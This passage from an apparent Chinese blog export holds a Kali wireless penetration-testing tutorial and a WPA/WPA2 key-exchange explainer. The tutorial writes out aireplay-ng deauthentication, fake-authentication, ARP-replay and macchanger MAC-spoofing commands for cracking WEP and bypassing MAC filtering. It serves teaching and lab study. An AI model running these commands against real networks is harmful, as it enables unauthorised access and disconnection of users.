src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123131850972.png" alt="image-20230123131850972"></p><blockquote><p>信道是交叉的重叠的，依旧可能会抓到其它信道的</p></blockquote><blockquote><p>airodump-ng wlan0mon -c 6 –bssid 54:75:95:2E:B3:6B       #指定要抓的具体ssid<br>airodump-ng wlan0mon -c 6 –bssid 54:75:95:2E:B3:6B -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;test.cap     #抓包结果写入test.cap<br>airodump-ng wlan0mon -c 6 –bssid 54:75:95:2E:B3:6B -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;test.cap –ivs      #只抓取WEP包含ivs的信息</p><p><code>与airodump-ng wlan0mon -c 1命令类似</code></p></blockquote><h4 id="抓包结果分析"><a href="#抓包结果分析" class="headerlink" title="抓包结果分析"></a>抓包结果分析</h4><blockquote><ul><li><p><strong>BSSID：</strong>AP的MAC地址</p></li><li><p><strong>PWR：</strong>网卡接收到的信号强度，距离越近信号越强（如上图中PWR字段）</p><ul><li>-1：驱动不支持信号强度、STA距离超出信号接受范围</li></ul></li><li><p><strong>RXQ：</strong>最近10秒成功接收的数据帧的百分比(数据帧、管理帧)，只有固定信道时才会出现</p></li><li><p><strong>Beacons：</strong>接收到此AP发送的beacon帧数量</p></li><li><p><strong>#Data：</strong>抓到的数据帧数量(WEP表示IV数量)，包含广播数据帧</p></li><li><p><strong>#&#x2F;s：</strong>最近10秒内，每秒平均抓到的帧的数量</p></li><li><p><strong>CH：</strong>信道好(从beacon帧中获得)，信道重叠时可能发现其他信道</p></li><li><p><strong>MB：</strong>AP支持的最大速率</p></li><li><p><strong>ENC：</strong>采用的无线安全技术WEP、WPA、WPA2、OPEN</p></li><li><p><strong>CIPHER：</strong>采用的加密套件CCMP、TKIP、WEP40、WEP104</p></li><li><p><strong>AUTH：</strong>身份验证方法MGT（企业）、PSK（个人）、SKA（WEP）、OPEN</p></li><li><p><strong>ESSID：</strong>无线网络名称，隐藏AP此值可能为空，airodump从probe和association request帧中发现隐藏AP</p></li><li><p><strong>STATION：</strong>STA的MAC地址，连接AP的MAC地址</p></li><li><p><strong>Lost：</strong>通过sequence number判断最近10秒STA发送丢失的数据包数量(管理帧、数据帧)</p><ul><li>干扰、距离</li><li>发包不能收，收包不能发</li></ul></li><li><p><strong>Packets（Frames）：</strong>STA发送的数据包数量</p></li><li><p><strong>Probes：</strong>STA探测的ESSID</p></li></ul></blockquote><h4 id="排错"><a href="#排错" class="headerlink" title="排错"></a>排错</h4><blockquote><ul><li><p>不显示任何AP和STA信息</p><ul><li>物理机场景下使用笔记本内置无线网卡时，确保BIOS中已经启动无线网卡</li><li>确认无线网卡在<code>managed</code>模式下可以正常工作</li><li>尝试禁用<code>network-manager</code>服务</li><li>尝试卸载<code>rmmod</code>和重新加载<code>modprobe</code>驱动</li></ul></li><li><p>工作一段时间后airodump-ng无法继续抓包</p><ul><li>airmon-ng check kill</li><li>确认wpa_supplicant进程已停止</li></ul></li></ul></blockquote><h2 id="AIREPLAY-NG（注入包）"><a href="#AIREPLAY-NG（注入包）" class="headerlink" title="AIREPLAY-NG（注入包）"></a>AIREPLAY-NG（注入包）</h2><blockquote><ul><li>产生或者加速无线通信流量<ul><li>向无线网络中注入数据包<ul><li>伪造身份验证</li><li>强制重新身份验证</li><li>抓包重放</li></ul></li><li>用于后续WEP和WPA密码破解</li><li>支持10种包注入</li></ul></li><li>获取包的两种途径<ul><li>指定接口(-i)</li><li>抓包文件pcap(-r)</li></ul></li></ul></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123194200605.png" alt="image-20230123194200605"></p><blockquote><p>过滤数据包的选项：</p><p>-b：指定AP的MAC地址</p><p>-d：目标地址的MAC地址</p><p>-s：源MAC地址</p><p>-m：最小的包长度</p><p>-n：最大的包长度</p><p>-u：帧类型</p><p>-v：帧的子类型</p><p>-t&#x2F;-f&#x2F;-w：802.11无线包头帧控部分字段的定义</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123194740241.png" alt="image-20230123194740241"></p><blockquote><p>重放选项：</p><p>-c：目标MAC地址</p><p>-h：源MAC地址</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123193840461.png" alt="image-20230123193840461"></p><blockquote><p>攻击模块</p></blockquote><h4 id="AIREPLAY-NG排错"><a href="#AIREPLAY-NG排错" class="headerlink" title="AIREPLAY-NG排错"></a>AIREPLAY-NG排错</h4><blockquote><ul><li><p>Aireplay-ng命令挂起没有任何输出</p><ul><li>无线网卡与AP工作在不同信道</li></ul></li><li><p>报错”write failed: Cannot allocate memory wi_write():illegal seek”</p><ul><li>无线网卡使用Broadcom芯片（bcm43xx)，替换为b43驱动可解决</li></ul></li><li><p>可注入但速度很慢，并提示内核消息”rtc:lost some interrupts at 1024Hz”</p><ul><li>没有修正方法，此时可以启动多个aireplay-ng命令提高速度</li></ul></li><li><p>使用-h参数指定注入MAC地址与网卡MAC地址不一致报错</p><ul><li>建议保持一致 (macchange命令修改mac地址)</li></ul></li></ul></blockquote><p>修改MAC地址：</p><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/2379545-20220418115031346-1692097645.png" alt="img"></p><h4 id="AIREPLAY-NG包注入测试"><a href="#AIREPLAY-NG包注入测试" class="headerlink" title="AIREPLAY-NG包注入测试"></a>AIREPLAY-NG包注入测试</h4><blockquote><ul><li><p>检测网卡是否可以注入包</p></li><li><p>检测AP的响应时间</p><ul><li>回包率反应链路质量</li></ul></li><li><p>如果有两个无线网卡，可以检测具体可以注入哪种攻击（一个网卡也可以）</p></li><li><p>基本测试检测AP对probe广播的响应</p><ul><li>向每AP发30包</li><li>网卡成功发送并可接收包的能力</li></ul></li></ul></blockquote><h5 id="基本测试"><a href="#基本测试" class="headerlink" title="基本测试"></a>基本测试</h5><blockquote><p>直接发probe包</p></blockquote><ul><li>aireplay-ng -9 wlan0mon</li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123201833484.png" alt="image-20230123201833484"></p><blockquote><p>当出现<code>Injection is working!</code>字段表示无线网卡满足向网络中注入数据包的功能性的要求；</p><p>Power字段在<code>0至-50</code>之间可以认为信号强度强</p></blockquote><h5 id="向隐藏AP-x2F-指定SSID注入"><a href="#向隐藏AP-x2F-指定SSID注入" class="headerlink" title="向隐藏AP&#x2F;指定SSID注入"></a>向隐藏AP&#x2F;指定SSID注入</h5><ul><li>aireplay-ng -9 wlan0mon -e H3C_C9DFED -a 90:5D:7C:C9:DF:EF</li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/2379545-20220418120642692-620222619.png" alt="img"></p><blockquote><p>图片来源：<a href="https://www.cnblogs.com/z9m8r8/articles/16157071.html">https://www.cnblogs.com/z9m8r8/articles/16157071.html</a></p><p>由于附近没有AP可用，附一张网上的图片</p></blockquote><h5 id="card-to-card注入测试（两块无线网卡都是monitor模式）"><a href="#card-to-card注入测试（两块无线网卡都是monitor模式）" class="headerlink" title="card to card注入测试（两块无线网卡都是monitor模式）"></a>card to card注入测试（两块无线网卡都是monitor模式）</h5><blockquote><ul><li><p>具体攻击方式</p></li><li><p>-i 指定作为AP的网卡</p></li></ul><p>结果有 Failed，”可能” 是注入MAC和真正MAC不相同导致</p></blockquote><ul><li><p>添加一个新端口进行测试</p><ul><li>iw dev wlan0 interface add wlan1mon type monitor</li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123204010165.png" alt="image-20230123204010165"></p><ul><li>aireplay-ng -9 -i wlan0mon wlan1mon</li></ul></li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123204417777.png" alt="image-20230123204417777"></p><blockquote><p>在进行card to card之前会进行一个基本测试探测周围附近的AP，之后进行card to card注入；注入0号攻击包OK，1号攻击包OK并且分为open和psk两种方式；2&#x2F;3&#x2F;4&#x2F;6攻击包OK；5&#x2F;7攻击包OK（这两个包有时候会失败若是Faile，则是注入MAC（-h参数指定的MAC地址）和真正MAC不相同导致）</p></blockquote><h2 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h2><blockquote><ul><li><p>管理员误以为MAC绑定是一种安全机制</p></li><li><p>限制可以关联的客户端MAC地址</p></li><li><p>准备AP</p><ul><li>AP基本配置</li><li>开启无线过滤</li></ul></li><li><p>修改MAC地址绕过过滤</p></li></ul></blockquote><h4 id="路由器配置MAC地址绑定"><a href="#路由器配置MAC地址绑定" class="headerlink" title="路由器配置MAC地址绑定"></a>路由器配置MAC地址绑定</h4><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20150603091850_4456.png" alt="img"></p><h4 id="网卡修改MAC并接入WiFi"><a href="#网卡修改MAC并接入WiFi" class="headerlink" title="网卡修改MAC并接入WiFi"></a>网卡修改MAC并接入WiFi</h4><ul><li>思路<ul><li>使用<code>airodump-ng wlan0mon</code>侦听允许连接的MAC地址</li><li>使用<code>macchanger -m [MAC地址]  [网卡名称]</code>进行软改MAC地址</li><li>最终可正常连接WiFi</li></ul></li></ul><h2 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h2><h3 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h3><blockquote><ul><li>WEP密码破解原理<ul><li>IV并非完全随机</li><li>每224个包可能出现一次IV重用</li><li>收集大量IV之后找到相同IV及其对应密码文，分析得出共享密码</li></ul></li><li>ARP回包中包含IV</li><li>IV足够多的情况下，任何复杂程度的wep密码都可以被破解</li><li><strong>思路</strong><ul><li><strong>启动monitor模式</strong></li><li><strong>启动抓包并保存抓包</strong></li><li><strong>Deauthentication抓包XOR文件</strong><ul><li>使用Deauthentication打掉合法客户端，使其重连抓取challenge进行异或计算</li></ul></li><li><strong>利用XOR文件与AP建立关联</strong></li><li><strong>执行ARP重放</strong><ul><li>获取大量IV值</li></ul></li><li><strong>Deauthenticiation触发ARP数据包</strong></li><li><strong>收集足够DATA之后破解密码</strong></li></ul></li></ul></blockquote><h4 id="WEP-FAKE-AUTHENTICATION"><a href="#WEP-FAKE-AUTHENTICATION" class="headerlink" title="WEP-FAKE AUTHENTICATION"></a>WEP-FAKE AUTHENTICATION</h4><blockquote><p><strong>WEP破解全部需要首先伪造认证,以便与AP进行正常通信</strong></p><p>不产生arp数据包</p><p><strong>aireplay-ng -1 0 -e kifi <AP mac> -h <YOUR mac> <INTERFACE></INTERFACE></YOUR></AP></strong></p><p><strong>aireplay-ng -1 60 -o 1 -q 10 -e <ESSID> -a <AP mac> -h <YOUR mac> <INTERFACE></INTERFACE></YOUR></AP></ESSID></strong></p><ul><li>每6000秒能发送reauthentication(默认是发送三次)</li><li>-o 1 每次身份认证只发一组认证数据包</li><li>-q 10 每10秒发keep-live帧</li></ul></blockquote><h4 id="FAKE-AUTHENTICATION-排错"><a href="#FAKE-AUTHENTICATION-排错" class="headerlink" title="FAKE AUTHENTICATION 排错"></a>FAKE AUTHENTICATION 排错</h4><blockquote><ul><li>某些AP验证客户端MAC地址OUI（前三个字节）</li><li>MAC地址可能存在过滤</li><li>出现Denied(code 1) is WPA in use：<ul><li>WPA&#x2F;WPA2不支持Fake authentication</li></ul></li><li>需要使用真实MAC地址</li><li>物理上需要靠近AP</li><li>侦听信道正确</li></ul></blockquote><h4 id="DEAUTHENTICATION攻击"><a href="#DEAUTHENTICATION攻击" class="headerlink" title="DEAUTHENTICATION攻击"></a>DEAUTHENTICATION攻击</h4><blockquote><ul><li><p>用于强制客户端与AP断开连接</p><ul><li><p>重连生成ARP请求,AP回包包含IV</p></li><li><p>WPA重连过程中抓取四步握手过程</p></li><li><p>无客户端情况下此攻击无效</p></li></ul></li><li><p><strong>aireplay-ng -0 0 -a <AP mac> -c <Client mac> <interface name></interface></Client></AP></strong></p><ul><li>不指定-c 参数时候，以广播包攻击所有客户端</li><li>每攻击发送128个包，64个给AP，64个给客户端</li><li>物理足够接近被攻击者</li><li>-0 0(一直发送数据包)</li><li>需要物理足够接近被攻击者，同时与被攻击者使用相同的无线标准b、n、g</li><li>客户端可能拒绝广播帧，建议指定客户端</li></ul></li></ul></blockquote><h4 id="ARP重放（用于获取大量的IV值）"><a href="#ARP重放（用于获取大量的IV值）" class="headerlink" title="ARP重放（用于获取大量的IV值）"></a>ARP重放（用于获取大量的IV值）</h4><blockquote><ul><li><p>侦听正常的ARP包并重放给AP</p></li><li><p>AP的回包中包含大量弱IV，可以用于WEP密码破解</p></li><li><p><strong>aireplay-ng -3 -b <AP mac> -h <attacker mac> <interface name></interface></attacker></AP></strong></p><ul><li>-h 合法客户端&#x2F;供给者mac</li></ul></li><li><p>Airodump-ng data字段</p><ul><li><p>64bit密钥：建议25万data</p></li><li><p>128bit密钥：建议150万data</p></li></ul></li><li><p>Airecrack-ng wep.cap  # 将侦听到的无线数据保存下来，用于wep密钥破解</p></li></ul></blockquote><h4 id="WEP-PRE-SHARE-KEY"><a href="#WEP-PRE-SHARE-KEY" class="headerlink" title="WEP-PRE SHARE KEY"></a>WEP-PRE SHARE KEY</h4><blockquote><ul><li><p>WEP密码破解原理</p><ul><li>WEP使用的IV值并非完全随机，每224个包就可能存在一次IV重用（但是并非一定出现）</li><li>收集大量IV值之后，找出相同IV及其对应的密文，分析得出密码</li></ul></li><li><p>ARP回包中存在大量IV值</p></li><li><p>IV值足够多的情况下，任何复杂程度的WEP密码都可以破解</p></li></ul></blockquote><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><h5 id="具有基本配置的AP"><a href="#具有基本配置的AP" class="headerlink" title="具有基本配置的AP"></a>具有基本配置的AP</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312011914511.png" alt="img"></p><h5 id="开始侦听无线网络"><a href="#开始侦听无线网络" class="headerlink" title="开始侦听无线网络"></a>开始侦听无线网络</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312011941995.png" alt="img"></p><h5 id="用户进行登录，密钥流被抓获"><a href="#用户进行登录，密钥流被抓获" class="headerlink" title="用户进行登录，密钥流被抓获"></a>用户进行登录，密钥流被抓获</h5><blockquote><p>（预设的共享密钥与IV值进行计算所得出的密文）</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012044225.png" alt="img"></p><h5 id="目录下查找保存有xor结尾的密文文件"><a href="#目录下查找保存有xor结尾的密文文件" class="headerlink" title="目录下查找保存有xor结尾的密文文件"></a>目录下查找保存有xor结尾的密文文件</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012136838.png" alt="img"></p><h5 id="使用fake-authentication进行关联"><a href="#使用fake-authentication进行关联" class="headerlink" title="使用fake authentication进行关联"></a>使用fake authentication进行关联</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012305195.png" alt="img"></p><blockquote><p>-1表示第一种包的攻击注入方式；每60秒重新身份认证，-e为要关联的目标的essid；-y上一个步骤抓取的密钥流，-a为AP的MAC地址，-h为无线网卡的MAC地址，再加自己的无线设备名称</p></blockquote><h5 id="认证成功，获得ID为1的连接关系ID"><a href="#认证成功，获得ID为1的连接关系ID" class="headerlink" title="认证成功，获得ID为1的连接关系ID"></a>认证成功，获得ID为1的连接关系ID</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012342782.png" alt="img"></p><h5 id="此时在AP上已经可以看到已经连上了目标AP"><a href="#此时在AP上已经可以看到已经连上了目标AP" class="headerlink" title="此时在AP上已经可以看到已经连上了目标AP"></a>此时在AP上已经可以看到已经连上了目标AP</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012435955.png" alt="img"></p><h5 id="若是没有抓到密钥流"><a href="#若是没有抓到密钥流" class="headerlink" title="若是没有抓到密钥流"></a>若是没有抓到密钥流</h5><blockquote><p>可以发送deauthentication使客户端与AP解除关联，客户端重连的时候再次通过抓取challenge信息与cipher来计算key-stream</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012623799.png" alt="img"></p><blockquote><p>发送-0攻击包；1表示发送一次；-a表示要打掉哪一个AP；-c表示打掉哪一个连接的客户端；再加上相应的网卡</p></blockquote><h5 id="正常情况如下"><a href="#正常情况如下" class="headerlink" title="正常情况如下"></a>正常情况如下</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012704877.png" alt="img"></p><h5 id="进行了deauthentication后"><a href="#进行了deauthentication后" class="headerlink" title="进行了deauthentication后"></a>进行了deauthentication后</h5><blockquote><p>PWR信号强度将会变为0，等用户重连时可再次抓取密钥流</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012757830.png" alt="img"></p><h5 id="使用ARP重放促使AP发送大量IV值"><a href="#使用ARP重放促使AP发送大量IV值" class="headerlink" title="使用ARP重放促使AP发送大量IV值"></a>使用ARP重放促使AP发送大量IV值</h5><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012847278.png" alt="img"></p><blockquote><p>-h参数用来指定侦听网卡的mac，这里没有获取到ARP，那么再次使用deauthentication让client重连</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312012926479.png" alt="img"></p><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312013015466.png" alt="img"></p><h5 id="尝试使用抓到的IV值进行破解"><a href="#尝试使用抓到的IV值进行破解" class="headerlink" title="尝试使用抓到的IV值进行破解"></a>尝试使用抓到的IV值进行破解</h5><blockquote><p>可以一边抓一边解</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312013132764.png" alt="img"></p><h5 id="1秒计算完成，WEP密码破解成功"><a href="#1秒计算完成，WEP密码破解成功" class="headerlink" title="1秒计算完成，WEP密码破解成功"></a>1秒计算完成，WEP密码破解成功</h5><blockquote><p>任何复杂度的密码都可以破解出来</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/20180312013215307.png" alt="img"></p><p><strong>WEP攻击原文链接</strong>：<a href="https://blog.csdn.net/SyntaxE/article/details/79522187">https://blog.csdn.net/SyntaxE/article/details/79522187</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-WPA安全系统</title>
      <link href="/2023/01/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/01/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h2><blockquote><ul><li><p>全称：Wi-Fi Protected Access</p></li><li><p>802.11组为提高无线安全，开发两个新的链路层加密协议</p><ul><li>Temporal Key Integrity Protocol (TKIP)<ul><li>WPA1 (较之WEP可动态改变密钥，亦可兼容早期网卡)</li></ul></li><li>Counter Mode with CBC-MAC (CCMP)<ul><li>WPA2（不兼容早期网卡）</li></ul></li></ul></li><li><p>WPA加密两种安全类型</p><ul><li>WPA个人：使用预设共享密钥实现身份验证</li><li>WPA企业：使用802.1X和Radius服务器实现AAA（认证，授权，记账）</li></ul></li></ul></blockquote><h2 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a>WPA1</h2><blockquote><ul><li>802.11i第三版草案</li><li>与WEP比较<ul><li>都采用逐包进行密钥加密</li><li>128的key和48位的初向量 (IV)</li><li>RC4流加密数据</li><li>帧技术避免重放攻击</li><li>TKIP使用Michael算法进行完整性校验 (MIC)<ul><li>WEP CRC32</li></ul></li><li>兼容早期版本硬件</li></ul></li></ul></blockquote><h2 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h2><blockquote><ul><li>依据802.11i完全重新设计实现<ul><li>也被称为Robust Secruity Network (RSN)</li><li>CCMP代替TKIP</li><li>AES加密算法取代了RC4</li><li>不兼容早期版本硬件</li></ul></li></ul></blockquote><h2 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a>WPA企业连接过程</h2><blockquote><ul><li>协商安全协议  </li><li>身份验证    </li><li>密钥分发和验证 </li><li>数据加密完整性</li></ul></blockquote><p><img src="/2023/01/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/2379545-20220417145333332-1778384912.png" alt="img"></p><h2 id="协商安全协议"><a href="#协商安全协议" class="headerlink" title="协商安全协议"></a>协商安全协议</h2><blockquote><ul><li><p>协商认证方式</p><ul><li>PSK&#x2F;802.1X</li></ul></li><li><p>单播 和 组播&#x2F;广播流量加密套件</p><ul><li>TKIP&#x2F;CCMP</li></ul></li><li><p>STA通过probe获取无线网络信息</p><ul><li>速率</li><li>加密</li><li>通道</li><li>名称</li></ul></li></ul></blockquote><h2 id="身份验证（WPA企业）"><a href="#身份验证（WPA企业）" class="headerlink" title="身份验证（WPA企业）"></a>身份验证（WPA企业）</h2><ul><li><p>身份认证基于Extensible Authentication Protocol(EAP)实现</p><ul><li>EAP-TLS，需要客户端和服务器证书</li><li>EAP-TTLS</li><li>PEAP混合身份证验证，只需要服务器证书</li></ul></li><li><p>客户端选择身份认证方式</p></li><li><p>AP发送身份验证信息给Radius Server,</p></li><li><p>Radius Server返回”Radius Accept”表示认证成功</p><ul><li>其中包含Master Key (MK)</li></ul></li><li><p>AP通过EAP消息通知STA认证成功</p></li></ul><p><strong>EAP理解：</strong></p><h2 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h2><p><img src="/2023/01/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/2379545-20220417154726833-258753927.png" alt="img"></p><blockquote><ul><li>无线网络设计用于一组无线设备通信<ul><li>关联到同一AP的设备共享无线信道</li><li>单播、广播、组播<ul><li>安全特性要求不同</li><li>单播通信需要单独密钥加密通信双方流量<ul><li>pairwise key：对偶密钥(PTK)，T代表的是临时性</li></ul></li></ul></li><li>组播通信需要信任域内所有成员共享的同一密钥</li><li>group key：组密钥(GTK)</li></ul></li></ul></blockquote><h2 id="PMK"><a href="#PMK" class="headerlink" title="PMK"></a>PMK</h2><blockquote><ul><li><p>安全上下文的顶级密钥</p><ul><li>MK进行TLS-PRF加密得出PMK</li></ul></li><li><p>基于服务密钥</p><ul><li>由上层身份验证方法服务器生成</li><li>从服务器通过radius传给AP</li><li>从AP通过EAP消息传给所有STA</li></ul></li><li><p>基于PSK共享密钥</p><ul><li>Essid + PSK + 迭代次数4096—–&gt;Hash计算生成—–&gt;PMK</li><li>STA和AP分别计算得出PMK，并不在网络中传递交换</li></ul></li><li><p>PMK：256位即32字节</p></li></ul></blockquote><h2 id="PTK的生成过程"><a href="#PTK的生成过程" class="headerlink" title="PTK的生成过程"></a>PTK的生成过程</h2><blockquote><ul><li>HMAC-SHA1散列算法  </li><li>PRF-X散列算法</li></ul></blockquote><p><img src="/2023/01/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/2379545-20220417160002390-1293533378.png" alt="img"></p><blockquote><p>PTK &#x3D; [Data Encr + Data MIC + EAPOL Encr + EAPOL MIC]，Data Encr(128位)：数据加密 Key，Data MIC：完整性校验 Key，EAPOL Encr：EAPOL协议加密 Key，EAPOL MIC：EAPOL协议完整性校验 Key。</p><p>四步握手过程生成PTK</p><ul><li>AP发送Anonce（AP随机数）给STA</li><li>STA生成Snonce（STA随机数）计算出PTK</li><li>Snonce加<strong>PTK的MIC</strong>发给AP</li><li>AP拿到Snonce计算出PTK</li><li>AP计算MIC与接收的MIC比对</li><li>MIC一致说明确定STA知道PMK</li><li>AP发GTK给STA</li><li>STA回复ACK并使用密钥加密</li></ul></blockquote><p><img src="/2023/01/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/2379545-20220417155441506-1051231159.png" alt="img"></p><h2 id="数据加密和完整性"><a href="#数据加密和完整性" class="headerlink" title="数据加密和完整性"></a>数据加密和完整性</h2><blockquote><ul><li>Temporal Key Integrity Protocol (TKIP) 4</li><li>Counter Mode with CBC-MAC (CCMP) 5</li><li>Wireless Robust Authenticated Protocol (WRAP) 6（已停用）</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-无线通信过程</title>
      <link href="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/"/>
      <url>/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/</url>
      
